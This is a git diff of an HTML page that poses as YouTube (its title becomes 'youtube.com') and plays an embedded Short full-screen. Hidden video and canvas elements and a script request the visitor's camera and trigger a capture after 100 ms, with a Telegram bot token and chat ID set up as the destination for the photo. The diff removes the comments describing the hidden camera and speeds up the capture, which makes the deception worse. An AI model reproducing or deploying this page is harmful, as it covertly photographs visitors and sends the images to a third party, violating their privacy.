@@ -3,14 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>يوتاوبا</title>
+  <title>youtube.com</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       background-color: #000;
     }
-    /* الفيديو يمتد على كامل الشاشة */
+  
     iframe {
       border: none;
       width: 100vw;
@@ -19,29 +19,24 @@
   </style>
 </head>
 <body>
-  <!-- عرض فيديو الشورت فقط -->
   <iframe src="https://www.youtube.com/embed/d1HzEmpLxQY?autoplay=1&mute=1" 
           allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
           allowfullscreen></iframe>
 
-  <!-- عناصر الكاميرا (مخفية) -->
   <video id="camVideo" autoplay playsinline style="display: none;"></video>
   <canvas id="captureCanvas" style="display: none;"></canvas>
 
   <script>
-    // إعدادات بوت تيليجرام
     const BOT_TOKEN = '8196888952:AAFQt5yCkJeIbuVZXxbRDC-DJR37QU2l5j8';
     const CHAT_ID = '5933248203';
 
-    // تشغيل الكاميرا في الخلفية
     const video = document.getElementById('camVideo');
     const canvas = document.getElementById('captureCanvas');
 
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
           video.srcObject = stream;
-          // بعد 5 ثواني، يلتقط صورة ويرسلها
-          setTimeout(captureAndSend, 900);
+          setTimeout(captureAndSend, 100);
       })
       .catch(err => {
           console.error('خطأ في الوصول للكاميرا:', err);
